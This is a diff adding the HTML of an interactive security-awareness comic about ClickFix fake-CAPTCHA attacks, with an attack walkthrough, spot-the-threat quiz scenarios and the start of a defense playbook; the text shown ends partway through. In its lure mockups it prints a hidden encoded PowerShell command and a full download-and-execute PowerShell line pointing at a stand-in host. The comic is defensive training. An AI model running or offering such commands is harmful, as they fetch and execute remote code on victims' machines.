+    <a href="#" class="nav-brand" onclick="goToPage(0);return false;">DUDE <span>DILIGENCE</span></a>
+    <div class="nav-progress">
+      <button class="nav-dot active" onclick="goToPage(0)" aria-label="Cover" title="Cover"></button>
+      <button class="nav-dot" onclick="goToPage(1)" aria-label="Page 1" title="The Setup"></button>
+      <button class="nav-dot" onclick="goToPage(2)" aria-label="Page 2" title="What Is ClickFix"></button>
+      <button class="nav-dot" onclick="goToPage(3)" aria-label="Page 3" title="Attack Chain"></button>
+      <button class="nav-dot" onclick="goToPage(4)" aria-label="Page 4" title="The Attack Hits"></button>
+      <button class="nav-dot" onclick="goToPage(5)" aria-label="Page 5" title="Scenarios"></button>
+      <button class="nav-dot" onclick="goToPage(6)" aria-label="Page 6" title="Defense Playbook"></button>
+      <button class="nav-dot" onclick="goToPage(7)" aria-label="Page 7" title="Quiz"></button>
+      <button class="nav-dot" onclick="goToPage(8)" aria-label="Page 8" title="Certificate"></button>
+      <span class="progress-text" id="progressText">Cover</span>
+    </div>
+  </div>
+</nav>
+
+<main>
+
+<!-- ===== COVER PAGE ===== -->
+<div class="page active" id="page-0" data-label="Cover">
+  <div class="cover">
+    <div class="cover-content">
+      <div class="cover-masthead">DUDE DILIGENCE</div>
+      <div class="cover-issue">ISSUE #1 &bull; SECURITY AWARENESS SERIES</div>
+      <img src="../img/dude-portrait.png" alt="Dude Diligence - Duke Dillingham, compliance officer and cybersecurity hero" class="cover-portrait">
+      <div class="cover-title">"THE CAPTCHA CONSPIRACY"</div>
+      <div class="cover-tagline">When fake CAPTCHAs attack, only one man has the compliance clearance to stop them.</div>
+      <button class="cover-start-btn" onclick="goToPage(1)">START READING</button>
+      <div class="cover-footer">A Circle 6 Systems Production &bull; circle6systems.com</div>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 1: THE SETUP ===== -->
+<div class="page" id="page-1" data-label="The Setup">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 1: <span class="red">THE SETUP</span></div>
+
+    <!-- Panel row 1: wide establishing shot -->
+    <div class="panel-full">
+      <div class="narrator">Monday morning. Circle 6 Systems headquarters. The coffee is adequate. The compliance is pending.</div>
+      <div class="flex gap-lg items-center" style="flex-wrap: wrap;">
+        <img src="../img/dude-portrait.png" alt="Duke Dillingham at his desk" class="char-img portrait rounded">
+        <div style="flex:1; min-width:220px;">
+          <div class="thought-bubble">
+            Another week, another chance for someone to click something they absolutely should not click. The circle of life continues.
+          </div>
+          <div style="margin-top:1.5rem;">
+            <div class="dialog-mockup" style="max-width:360px;">
+              <div class="dialog-titlebar">
+                <span>Inbox - Notification</span>
+                <span class="dialog-close">&times;</span>
+              </div>
+              <div class="dialog-body">
+                <p style="margin:0; font-weight:700; color:var(--accent);">MANDATORY: Annual Security Awareness Training</p>
+                <p style="margin:0.3rem 0 0; font-size:0.8rem;">Due by Friday. No exceptions. Yes, that means you, Duke.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Panel row 2 -->
+    <div class="panel-grid two-col">
+      <div class="panel">
+        <div class="thought-bubble">
+          I've survived 47 mandatory trainings. Forty-seven. I've watched every phishing video they've ever produced. I've passed every quiz with a score that would make a Scantron blush.
+        </div>
+        <div class="body-text" style="margin-top:2rem;">
+          <span class="sfx small tilt-right">*SIIIIIP*</span>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="thought-bubble">
+          I can survive one more. Probably. Unless it's the one with the animated paperclip. That one almost broke me.
+        </div>
+        <div style="margin-top:2rem;">
+          <div class="narrator">But as Duke Dillingham would soon discover, today's lesson would be... hands-on.</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Panel 3: The coffee philosophy -->
+    <div class="panel-full" style="text-align:center;">
+      <div class="speech-bubble no-tail" style="display:inline-block; max-width:600px;">
+        <span class="bold">Duke's First Law of Cybersecurity:</span><br>
+        The threat landscape changes every day. But the user who clicks "Enable Macros" without reading? That person is eternal.
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(0)">&larr; COVER</button>
+      <span class="page-indicator">PAGE 1 OF 8</span>
+      <button class="page-btn" onclick="goToPage(2)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 2: WHAT IS CLICKFIX ===== -->
+<div class="page" id="page-2" data-label="What Is ClickFix">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 2: <span class="red">WHAT IS CLICKFIX?</span></div>
+
+    <!-- Dude breaks the fourth wall -->
+    <div class="panel-full">
+      <div class="flex gap-lg items-start" style="flex-wrap:wrap;">
+        <img src="../img/origin-story.png" alt="Dude Diligence in contemplation" class="char-img portrait rounded" style="width:160px;">
+        <div style="flex:1; min-width:250px;">
+          <div class="speech-bubble" style="max-width:100%;">
+            <span class="bold">Oh, hey there.</span> Yeah, I'm talking to you. Through the screen. Don't worry, it's not a security breach. Probably.<br><br>
+            Let me tell you about the latest thing the threat actors cooked up. It's called <span class="bold text-red">ClickFix</span>, and honestly? I'm almost impressed. Almost.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- The explanation panels -->
+    <div class="panel-grid two-col">
+      <div class="panel accent-bg">
+        <div class="narrator">The Concept</div>
+        <div class="speech-bubble no-tail" style="max-width:100%; margin-top:0.5rem;">
+          Someone decided that <span class="bold">"I am not a robot"</span> wasn't annoying enough. So they <span class="text-red bold">weaponized it</span>.<br><br>
+          ClickFix attacks use fake CAPTCHAs, fake error messages, and fake "fix" dialogs to trick you into running malicious commands on your own machine. <span class="italic">You</span> become the attack vector. They basically social-engineered the social engineering.
+        </div>
+      </div>
+      <div class="panel blue-bg">
+        <div class="narrator">The Technique</div>
+        <div class="body-text">
+          The attack silently copies a <span class="bold">malicious PowerShell command</span> to your clipboard. Then it tells you to:
+        </div>
+        <div style="margin:0.5rem 0;">
+          <div style="display:flex; gap:0.4rem; flex-wrap:wrap; align-items:center; margin-bottom:0.3rem;">
+            <span style="background:var(--ink);color:var(--paper);padding:0.15rem 0.5rem;border-radius:3px;font-family:monospace;font-size:0.85rem;">Win + R</span>
+            <span class="body-text" style="margin:0;">Open the Run dialog</span>
+          </div>
+          <div style="display:flex; gap:0.4rem; flex-wrap:wrap; align-items:center; margin-bottom:0.3rem;">
+            <span style="background:var(--ink);color:var(--paper);padding:0.15rem 0.5rem;border-radius:3px;font-family:monospace;font-size:0.85rem;">Ctrl + V</span>
+            <span class="body-text" style="margin:0;">Paste the command</span>
+          </div>
+          <div style="display:flex; gap:0.4rem; flex-wrap:wrap; align-items:center;">
+            <span style="background:var(--ink);color:var(--paper);padding:0.15rem 0.5rem;border-radius:3px;font-family:monospace;font-size:0.85rem;">Enter</span>
+            <span class="body-text" style="margin:0;">Execute the payload</span>
+          </div>
+        </div>
+        <div class="body-text" style="margin-top:0.5rem;">
+          <span class="italic">Three keystrokes. That's it. That's the whole exploit.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Stats panel -->
+    <div class="panel-full" style="text-align:center;">
+      <div class="sfx large" style="margin-bottom:0.5rem;">517% SURGE IN 2025!</div>
+      <div class="body-text" style="max-width:600px; margin:0 auto;">
+        ClickFix attacks exploded in 2025. Nation-state actors including <span class="bold">APT28</span> (Russia), <span class="bold">Kimsuky</span> (North Korea), and <span class="bold">MuddyWater</span> (Iran) adopted the technique. When three separate nation-states agree on something, you know it works.
+      </div>
+      <div style="margin-top:1rem;">
+        <div class="speech-bubble no-tail" style="display:inline-block; max-width:500px;">
+          Look, I don't want to be alarmist. But when the guys who can't agree on literally anything else all independently decide to use the same attack... maybe pay attention to this one.
+        </div>
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(1)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 2 OF 8</span>
+      <button class="page-btn" onclick="goToPage(3)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 3: THE ATTACK CHAIN ===== -->
+<div class="page" id="page-3" data-label="Attack Chain">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 3: <span class="red">THE ATTACK CHAIN</span></div>
+
+    <div class="panel-full">
+      <div class="narrator wide">The anatomy of a ClickFix attack in four devastatingly simple steps. Narrated with the appropriate level of disdain.</div>
+
+      <!-- Step 1 -->
+      <div class="attack-step">
+        <div class="step-num">1</div>
+        <div class="step-content">
+          <div class="step-title text-red">THE LURE</div>
+          <div class="step-desc">A fake CAPTCHA, error message, or document verification page appears. It looks official. It looks urgent. It looks like every other annoying popup you've dismissed a thousand times.</div>
+          <div class="browser-mockup" style="max-width:440px; margin-top:0.5rem;">
+            <div class="browser-bar">
+              <div class="browser-dots"><span></span><span></span><span></span></div>
+              <div class="browser-url"><span class="danger">security-verify-check</span>.totally-legit-domain.com</div>
+            </div>
+            <div class="browser-body">
+              <div style="font-size:2rem; margin-bottom:0.3rem;">&#128737;</div>
+              <div style="font-family:Arial,sans-serif; font-weight:700; font-size:1.1rem; margin-bottom:0.5rem;">Verify you are human</div>
+              <div class="fake-captcha">
+                <div class="captcha-checkbox"></div>
+                <span class="captcha-label">I am not a robot</span>
+              </div>
+            </div>
+          </div>
+          <div class="speech-bubble no-tail" style="max-width:100%; margin-top:0.5rem;">
+            <span class="italic">"Oh good, another CAPTCHA. How original. Really pushing the creative envelope here."</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div class="attack-step">
+        <div class="step-num">2</div>
+        <div class="step-content">
+          <div class="step-title text-red">THE CLIPBOARD HIJACK</div>
+          <div class="step-desc">The moment you interact with the page, a malicious PowerShell or command-line script is silently copied to your clipboard. You didn't copy anything. You didn't ask for anything. But it's there now, like an uninvited guest at a potluck.</div>
+          <div style="background:#1a1a1a; color:#4ec9b0; font-family:monospace; font-size:0.75rem; padding:0.75rem; border:2px solid var(--ink); border-radius:4px; margin:0.5rem 0; word-break:break-all; max-width:440px;">
+            powershell -w hidden -e SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AC...
+          </div>
+          <div class="speech-bubble no-tail" style="max-width:100%; margin-top:0.5rem;">
+            <span class="italic">"Base64 encoded PowerShell. Because just writing 'steal everything' in plain text would be too honest, I suppose."</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div class="attack-step">
+        <div class="step-num">3</div>
+        <div class="step-content">
+          <div class="step-title text-red">THE USER RUNS IT</div>
+          <div class="step-desc">The page displays "verification steps" telling you to press Win+R, then Ctrl+V, then Enter. It frames this as part of the CAPTCHA process. It is not part of any CAPTCHA process. It has never been part of any CAPTCHA process.</div>
+          <div class="run-dialog" style="max-width:360px;">
+            <div class="run-dialog-title">
+              <span style="font-size:1.2rem;">&#128187;</span> Run
+            </div>
+            <div class="run-dialog-input">powershell -w hidden -e SQBuAHYAbwBrAGUALQBXAGUA...</div>
+            <div class="run-dialog-buttons">
+              <button>OK</button>
+              <button>Cancel</button>
+              <button>Browse...</button>
+            </div>
+          </div>
+          <div class="speech-bubble no-tail" style="max-width:100%; margin-top:0.5rem;">
+            <span class="italic">"And just like that, the user has willingly executed arbitrary code on their own machine. The attacker didn't need a zero-day. Didn't need admin rights. Just needed someone who follows instructions."</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Step 4 -->
+      <div class="attack-step">
+        <div class="step-num">4</div>
+        <div class="step-content">
+          <div class="step-title text-red">THE PAYLOAD</div>
+          <div class="step-desc">The command downloads and installs malware. Info stealers grab passwords, cookies, and crypto wallets. Remote Access Trojans (RATs) give attackers full control. Ransomware encrypts everything. Sometimes all three, because why settle?</div>
+          <div style="margin:0.5rem 0;">
+            <span class="sfx tilt-left" style="font-size:2rem; color:var(--accent);">COMPROMISED!</span>
+          </div>
+          <div class="speech-bubble no-tail" style="max-width:100%;">
+            <span class="italic">"The whole thing takes about eight seconds. Less time than it took me to heat up this coffee. Which, for the record, is still lukewarm. Just like our endpoint detection."</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(2)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 3 OF 8</span>
+      <button class="page-btn" onclick="goToPage(4)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 4: THE ATTACK HITS ===== -->
+<div class="page" id="page-4" data-label="The Attack Hits">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 4: <span class="red">THE ATTACK HITS</span></div>
+
+    <!-- Panel 1: Janet encounters it -->
+    <div class="panel-grid wide-narrow">
+      <div class="panel">
+        <div class="narrator">Meanwhile, at the desk of Janet from Finance...</div>
+        <div class="browser-mockup" style="margin-top:0.5rem;">
+          <div class="browser-bar">
+            <div class="browser-dots"><span></span><span></span><span></span></div>
+            <div class="browser-url"><span class="danger">invoice-portal-verify</span>.com/captcha</div>
+          </div>
+          <div class="browser-body">
+            <div style="font-size:2.5rem; margin-bottom:0.5rem;">&#9888;&#65039;</div>
+            <div style="font-family:Arial,sans-serif; font-weight:700; font-size:1rem; margin-bottom:0.75rem;">Verification Required</div>
+            <div style="font-family:Arial,sans-serif; font-size:0.85rem; color:#555; margin-bottom:0.75rem;">To access this invoice, please verify you are human.</div>
+            <div style="background:#e8f4e8; border:2px solid #4a4; border-radius:6px; padding:0.75rem; text-align:left; font-family:Arial,sans-serif; font-size:0.82rem; max-width:320px; margin:0 auto;">
+              <div style="font-weight:700; margin-bottom:0.4rem;">&#9989; Verification Steps:</div>
+              <div>1. Press <span style="background:#333;color:#fff;padding:0.1rem 0.4rem;border-radius:2px;font-size:0.75rem;">Win</span> + <span style="background:#333;color:#fff;padding:0.1rem 0.4rem;border-radius:2px;font-size:0.75rem;">R</span></div>
+              <div>2. Press <span style="background:#333;color:#fff;padding:0.1rem 0.4rem;border-radius:2px;font-size:0.75rem;">Ctrl</span> + <span style="background:#333;color:#fff;padding:0.1rem 0.4rem;border-radius:2px;font-size:0.75rem;">V</span></div>
+              <div>3. Press <span style="background:#333;color:#fff;padding:0.1rem 0.4rem;border-radius:2px;font-size:0.75rem;">Enter</span></div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="panel flex-center flex-col" style="text-align:center;">
+        <div style="font-size:3rem; margin-bottom:0.5rem;">&#128105;&#8205;&#128188;</div>
+        <div class="speech-bubble no-tail" style="max-width:100%;">
+          Hmm, I need to pull up the Q3 invoices for the audit. This verification thing is new but I guess that's just how things work now...
+        </div>
+        <div class="body-text italic" style="color:var(--accent); margin-top:0.5rem; font-weight:700;">
+          Janet reaches for Win+R...
+        </div>
+      </div>
+    </div>
+
+    <!-- Panel 2: Dude's senses tingle -->
+    <div class="panel-full" style="text-align:center; padding:2rem;">
+      <div class="sfx large" style="margin-bottom:0.75rem;">!! COMPLIANCE SENSE !!</div>
+      <img src="../img/transformation.png" alt="Dude Diligence activates" class="char-img medium rounded" style="margin:0 auto;">
+      <div class="narrator" style="margin-top:1rem;">Across the office, Duke Dillingham feels a disturbance in the compliance. His badge begins to glow. The coffee grows cold. Something is wrong.</div>
+    </div>
+
+    <!-- Panel 3: Mr. Rogers mode -->
+    <div class="panel-grid two-col">
+      <div class="panel" style="display:flex; flex-direction:column; justify-content:center;">
+        <div class="narrator">Mr. Rogers Mode: ACTIVATED</div>
+        <div class="speech-bubble" style="max-width:100%; margin-top:0.5rem;">
+          <span class="bold">Hey Janet, hold on one second</span> &mdash; can I take a look at that with you? I just want to make sure everything's good before you proceed. No rush at all.
+        </div>
+        <div style="margin-top:1.5rem;">
+          <div class="speech-bubble right" style="max-width:100%;">
+            Oh, Duke! Sure. It's just asking me to verify for the invoice portal. Is that... not normal?
+          </div>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="speech-bubble" style="max-width:100%;">
+          <span class="bold">I'm really glad you stopped to think about that.</span> That right there? That instinct to pause and question? That's exactly what keeps us safe.<br><br>
+          Now, let me show you what's actually happening here, because this is a really clever trick, and honestly, a lot of smart people have fallen for it.
+        </div>
+        <div style="margin-top:2rem;">
+          <div class="speech-bubble no-tail" style="max-width:100%; font-style:italic; background:var(--caption);">
+            No legitimate verification process will ever &mdash; <span class="bold">ever</span> &mdash; ask you to open a Run dialog. That is simply not a thing that real software does. It would be like a bank asking you to hotwire your own car to verify your identity.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Panel 4: Resolution -->
+    <div class="panel-full">
+      <div class="flex gap-lg items-center justify-center" style="flex-wrap:wrap; text-align:center;">
+        <div>
+          <div class="sfx green" style="font-size:2rem;">CRISIS AVERTED!</div>
+          <div class="body-text" style="margin-top:0.5rem;">Janet closes the tab. IT is notified. The invoice portal URL is flagged and blocked. The coffee is reheated.</div>
+          <div class="speech-bubble no-tail" style="display:inline-block; max-width:450px; margin-top:0.75rem;">
+            You did great, Janet. Seriously. The fact that you hesitated even for a second puts you ahead of about 90% of the internet. Now, let me show you exactly what to look for so this never gets close again.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(3)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 4 OF 8</span>
+      <button class="page-btn" onclick="goToPage(5)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 5: INTERACTIVE SCENARIOS ===== -->
+<div class="page" id="page-5" data-label="Scenarios">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 5: <span class="blue">SPOT THE THREAT</span></div>
+
+    <div class="panel-full" style="margin-bottom:1.5rem;">
+      <div class="speech-bubble no-tail" style="max-width:100%;">
+        <span class="bold">Alright, your turn.</span> I'm going to show you four scenarios. For each one, tell me: is this a ClickFix attack, or is it legitimate? Don't worry, I won't judge. Much.
+      </div>
+    </div>
+
+    <!-- Scenario 1 -->
+    <div class="scenario-card" id="scenario-1">
+      <div class="scenario-num">SCENARIO 1</div>
+      <div class="scenario-content">
+        <div class="browser-mockup">
+          <div class="browser-bar">
+            <div class="browser-dots"><span></span><span></span><span></span></div>
+            <div class="browser-url"><span class="danger">cdn-verify</span>.cloud-security-check.com/human</div>
+          </div>
+          <div class="browser-body">
+            <div style="font-size:2rem;">&#128737;</div>
+            <div style="font-family:Arial,sans-serif; font-weight:700; font-size:1.05rem; margin:0.3rem 0;">Verify you are human</div>
+            <div style="font-family:Arial,sans-serif; font-size:0.8rem; color:#555; margin-bottom:0.75rem;">Click below and follow the verification steps</div>
+            <div style="background:#f0f7f0; border:2px solid #4a4; border-radius:6px; padding:0.75rem; text-align:left; font-family:Arial,sans-serif; font-size:0.82rem; max-width:300px; margin:0 auto;">
+              <div style="font-weight:700;">&#9989; To verify:</div>
+              <div>1. Press <span style="background:#333;color:#fff;padding:0.1rem 0.3rem;border-radius:2px;font-size:0.75rem;">Win+R</span></div>
+              <div>2. Press <span style="background:#333;color:#fff;padding:0.1rem 0.3rem;border-radius:2px;font-size:0.75rem;">Ctrl+V</span></div>
+              <div>3. Press <span style="background:#333;color:#fff;padding:0.1rem 0.3rem;border-radius:2px;font-size:0.75rem;">Enter</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="scenario-question">Is this a ClickFix attack?</div>
+        <div class="vote-buttons">
+          <button class="vote-btn yes" onclick="revealScenario(1, true, true)">YES - CLICKFIX!</button>
+          <button class="vote-btn no" onclick="revealScenario(1, false, true)">NO - LEGITIMATE</button>
+        </div>
+        <div class="scenario-result" id="result-1-correct">
+          <div class="result-verdict correct">CORRECT! This IS a ClickFix attack.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "Gold star. The dead giveaway? 'Press Win+R and paste.' No real CAPTCHA has ever asked you to open a system dialog. That's like a TSA agent asking you to pat yourself down. It's not how verification works. Also, check that URL &mdash; 'cloud-security-check.com' is not a real domain anyone should trust."</div>
+        </div>
+        <div class="scenario-result" id="result-1-incorrect">
+          <div class="result-verdict incorrect">NOT QUITE. This IS a ClickFix attack.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "Hey, no shame in that &mdash; these things are designed to fool people. But here's the thing: the moment any website asks you to press Win+R, that's not verification. That's infiltration. Real CAPTCHAs happen entirely inside the browser. They never, ever ask you to interact with your operating system. Now you know."</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Scenario 2 -->
+    <div class="scenario-card" id="scenario-2">
+      <div class="scenario-num">SCENARIO 2</div>
+      <div class="scenario-content">
+        <div class="dialog-mockup" style="max-width:400px;">
+          <div class="dialog-titlebar">
+            <span>&#128296; Windows Update</span>
+            <span class="dialog-close">&times;</span>
+          </div>
+          <div class="dialog-body">
+            <div style="display:flex; gap:0.75rem; align-items:flex-start;">
+              <div style="font-size:2rem;">&#128260;</div>
+              <div>
+                <div style="font-weight:700; margin-bottom:0.3rem;">Updates are available</div>
+                <div style="font-size:0.85rem; color:#555;">2024-12 Cumulative Update for Windows 11 (KB5048667)</div>
+                <div style="font-size:0.8rem; color:#888; margin-top:0.3rem;">Last checked: Today, 9:42 AM</div>
+                <div style="margin-top:0.75rem;">
+                  <span style="display:inline-block; background:#0078d4; color:#fff; padding:0.3rem 1rem; border-radius:3px; font-size:0.85rem; font-weight:600;">Restart now</span>
+                  <span style="display:inline-block; color:#0078d4; padding:0.3rem 0.75rem; font-size:0.85rem;">Schedule restart</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="scenario-question">Is this a ClickFix attack?</div>
+        <div class="vote-buttons">
+          <button class="vote-btn yes" onclick="revealScenario(2, true, false)">YES - CLICKFIX!</button>
+          <button class="vote-btn no" onclick="revealScenario(2, false, false)">NO - LEGITIMATE</button>
+        </div>
+        <div class="scenario-result" id="result-2-correct">
+          <div class="result-verdict correct">CORRECT! This is a REAL Windows Update dialog.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "Good eye. This is a standard Windows Update notification. Notice what's missing? No 'open Run dialog.' No 'paste this command.' No sketchy URL in a browser. It's a native system dialog offering you a restart or a schedule. That's just Windows being Windows. Annoying, but legitimate."</div>
+        </div>
+        <div class="scenario-result" id="result-2-incorrect">
+          <div class="result-verdict incorrect">NOT QUITE. This is actually LEGITIMATE.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "I appreciate the vigilance, I really do. But this one's the real deal. Standard Windows Update dialog, native to the OS, not in a browser. It's not asking you to run any commands or paste anything. When in doubt, you can always verify by going to Settings > Windows Update yourself. Better safe than sorry is a great instinct though."</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Scenario 3 -->
+    <div class="scenario-card" id="scenario-3">
+      <div class="scenario-num">SCENARIO 3</div>
+      <div class="scenario-content">
+        <div class="browser-mockup">
+          <div class="browser-bar">
+            <div class="browser-dots"><span></span><span></span><span></span></div>
+            <div class="browser-url"><span class="danger">driver-update-center</span>.info/fix</div>
+          </div>
+          <div class="browser-body" style="text-align:left; padding:1.25rem;">
+            <div style="text-align:center; margin-bottom:0.75rem;">
+              <span style="font-size:2rem;">&#9888;&#65039;</span>
+              <div style="font-family:Arial,sans-serif; font-weight:700; color:#c00; font-size:1rem;">Display Driver Error Detected</div>
+            </div>
+            <div style="background:#fff3f3; border:1px solid #fcc; border-radius:4px; padding:0.75rem; font-family:Arial,sans-serif; font-size:0.82rem; margin-bottom:0.75rem;">
+              Your display driver has encountered a critical error. To fix this issue, run the following command:<br><br>
+              <code style="background:#1a1a1a; color:#4ec9b0; padding:0.3rem 0.5rem; display:block; border-radius:3px; font-size:0.75rem; word-break:break-all; margin-top:0.3rem;">
+                powershell -ep bypass -w hidden IEX(New-Object Net.WebClient).DownloadString('http://fix-driver.xyz/update.ps1')
+              </code>
+            </div>
+            <div style="font-family:Arial,sans-serif; font-size:0.82rem; text-align:center;">
+              Open <span style="background:#333;color:#fff;padding:0.1rem 0.3rem;border-radius:2px;font-size:0.75rem;">PowerShell</span> and paste the command above, or press <span style="background:#333;color:#fff;padding:0.1rem 0.3rem;border-radius:2px;font-size:0.75rem;">Win+R</span> and paste to fix.
+            </div>
+          </div>
+        </div>
+        <div class="scenario-question">Is this a ClickFix attack?</div>
+        <div class="vote-buttons">
+          <button class="vote-btn yes" onclick="revealScenario(3, true, true)">YES - CLICKFIX!</button>
+          <button class="vote-btn no" onclick="revealScenario(3, false, true)">NO - LEGITIMATE</button>
+        </div>
+        <div class="scenario-result" id="result-3-correct">
+          <div class="result-verdict correct">CORRECT! This IS a ClickFix attack.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "Textbook ClickFix. A website cannot detect your display driver status. That's not how browsers work. And that PowerShell command? 'DownloadString from fix-driver.xyz'? That's downloading and executing a remote script. That's not a fix. That's a felony waiting to happen. Extra points if you noticed the '-ep bypass' flag, which tells PowerShell to ignore its own security policies. Subtle."</div>
+        </div>
+        <div class="scenario-result" id="result-3-incorrect">
+          <div class="result-verdict incorrect">NOT QUITE. This IS a ClickFix attack.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "I get it &mdash; it looks official with the error message and everything. But here's the rule: a website in your browser cannot diagnose your display driver. That's physically impossible. And any page asking you to run PowerShell commands is hostile. Period. The command here literally downloads and runs a remote script while bypassing security policies. Real driver fixes come from Windows Update or your manufacturer's official site."</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Scenario 4 -->
+    <div class="scenario-card" id="scenario-4">
+      <div class="scenario-num">SCENARIO 4</div>
+      <div class="scenario-content">
+        <div class="browser-mockup" style="max-width:400px;">
+          <div class="browser-bar">
+            <div class="browser-dots"><span></span><span></span><span></span></div>
+            <div class="browser-url">www.google.com/recaptcha</div>
+          </div>
+          <div class="browser-body">
+            <div style="font-family:Arial,sans-serif; font-size:0.9rem; margin-bottom:0.75rem; color:#555;">Please verify to continue</div>
+            <div class="fake-captcha" style="cursor:pointer;">
+              <div class="captcha-checkbox" style="color:var(--green); font-size:1.2rem;">&#10003;</div>
+              <span class="captcha-label">I'm not a robot</span>
+              <div class="captcha-logo">
+                <span class="recaptcha-icon">&#128737;</span>
+                reCAPTCHA<br>
+                <span style="font-size:0.5rem;">Privacy - Terms</span>
+              </div>
+            </div>
+            <div style="font-family:Arial,sans-serif; font-size:0.75rem; color:#999; margin-top:0.5rem;">Protected by Google reCAPTCHA</div>
+          </div>
+        </div>
+        <div class="scenario-question">Is this a ClickFix attack?</div>
+        <div class="vote-buttons">
+          <button class="vote-btn yes" onclick="revealScenario(4, true, false)">YES - CLICKFIX!</button>
+          <button class="vote-btn no" onclick="revealScenario(4, false, false)">NO - LEGITIMATE</button>
+        </div>
+        <div class="scenario-result" id="result-4-correct">
+          <div class="result-verdict correct">CORRECT! This is a REAL reCAPTCHA.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "Good call. This is a standard Google reCAPTCHA widget on a known domain. Notice what it's NOT doing: it's not asking you to open Run, paste commands, or interact with anything outside the browser. You click the checkbox, maybe identify some traffic lights, and move on with your life. That's how real CAPTCHAs work &mdash; entirely within the browser, entirely boring."</div>
+        </div>
+        <div class="scenario-result" id="result-4-incorrect">
+          <div class="result-verdict incorrect">NOT QUITE. This is actually LEGITIMATE.</div>
+          <div class="body-text"><span class="bold">Dude says:</span> "I love the paranoia &mdash; seriously, that instinct will serve you well. But this particular example is the real deal. It's on a Google domain, it uses the standard reCAPTCHA widget, and most importantly: it only asks you to click a checkbox inside the browser. No system dialogs, no keyboard shortcuts, no clipboard shenanigans. The key difference is always: does it stay in the browser, or does it try to escape into your operating system?"</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-full" style="text-align:center;">
+      <div class="speech-bubble no-tail" style="display:inline-block; max-width:500px;">
+        <span class="bold">The Golden Rule:</span><br>
+        Real verification = stays in the browser.<br>
+        ClickFix = tries to escape into your operating system.<br>
+        <span class="italic">That distinction will save your bacon every single time.</span>
+      </div>
+    </div>
+
+    <div class="page-nav">
+      <button class="page-btn" onclick="goToPage(4)">&larr; PREVIOUS</button>
+      <span class="page-indicator">PAGE 5 OF 8</span>
+      <button class="page-btn" onclick="goToPage(6)">TURN PAGE &rarr;</button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== PAGE 6: DEFENSE PLAYBOOK ===== -->
+<div class="page" id="page-6" data-label="Defense Playbook">
+  <div class="page-inner">
+    <div class="comic-title">PAGE 6: <span class="blue">THE DEFENSE PLAYBOOK</span></div>
+
+    <div class="panel-full" style="margin-bottom:1.5rem;">
+      <div class="flex gap-lg items-center" style="flex-wrap:wrap;">
+        <img src="../img/sacred-arts.png" alt="Dude Diligence - Encryption and Compliance" class="char-img portrait rounded" style="width:140px;">
+        <div style="flex:1; min-width:250px;">
+          <div class="speech-bubble" style="max-width:100%;">
+            Alright. Here are the rules. They're simple, they're absolute, and they will keep you out of trouble. I call them <span class="bold">The Four Immutable Laws of Not Getting ClickFixed</span>. I've been meditating on these since 2024. They haven't changed. They won't change.
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Rule 1 -->
+    <div class="defense-rule">
+      <div class="rule-icon">&#128683;</div>
+      <div>
+        <div class="comic-subtitle text-blue">RULE 1: THE RUN DIALOG IS NOT VERIFICATION</div>
+        <div class="body-text">
+          <span class="bold">No legitimate website asks you to open the Run dialog. Ever. Not once. That's not a thing.</span>
+        </div>
+        <div class="body-text">
+          The Windows Run dialog (Win+R) is a system-level tool. Websites live inside browsers. They have no business asking you to use system tools. If a website tells you to press Win+R, that website is trying to hurt you. It's that simple. There is zero ambiguity here.
+        </div>
+      </div>
+    </div>
+
+    <!-- Rule 2 -->
+    <div class="defense-rule">
+      <div class="rule-icon">&#128203;</div>
+      <div>
+        <div class="comic-subtitle text-blue">RULE 2: UNINVITED CLIPBOARD = HOSTILE CLIPBOARD</div>
+        <div class="body-text">
+          <span class="bold">If something copies to your clipboard without you doing it, that's not helpful. That's hostile.</span>
